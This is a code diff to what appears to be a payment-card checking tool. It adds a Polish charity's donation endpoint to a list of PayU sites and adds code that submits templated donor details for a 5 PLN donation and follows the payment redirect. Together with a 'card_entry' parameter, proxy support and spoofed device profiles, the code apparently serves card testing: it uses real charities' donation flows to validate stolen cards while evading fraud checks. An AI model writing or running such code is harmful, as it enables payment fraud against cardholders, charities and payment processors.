@@ -404,6 +404,27 @@ PAYU_SITES = {
             "_wp_http_referer": "/?wc-ajax=update_order_review&elementor_page_id=4866",
         },
     },
+    "twojasprawa": {
+        "create_type": "get_api",
+        "create_url": "https://twojasprawa.org.pl/api/news/payment",
+        "redirect_field": "app-redirect-uri",
+        "referer": "https://twojasprawa.org.pl/strony/wesprzyj-nas-darowizna",
+        "origin": "https://twojasprawa.org.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "query_params": {
+            "firstName": "{first}",
+            "lastName": "{last}",
+            "email": "{email}",
+            "amount": "5",
+            "recurring": "false",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -773,6 +794,12 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Sec-Fetch-Site": "cross-site"})
             redirect = r3.headers.get("Location") or ""
+        elif cfg["create_type"] == "get_api":
+            q = {k: v.format(first=first, last=last, email=email) for k, v in cfg.get("query_params", {}).items()}
+            r = await s.get(cfg["create_url"], params=q,
+                            headers={"Referer": cfg["referer"], "Origin": cfg["origin"], "Accept": "*/*"})
+            data = r.json()
+            redirect = data.get(cfg.get("redirect_field", "app-redirect-uri")) or ""
         elif cfg["create_type"] == "json_api":
             body = dict(cfg["json_body"])
             for k, v in body.items():
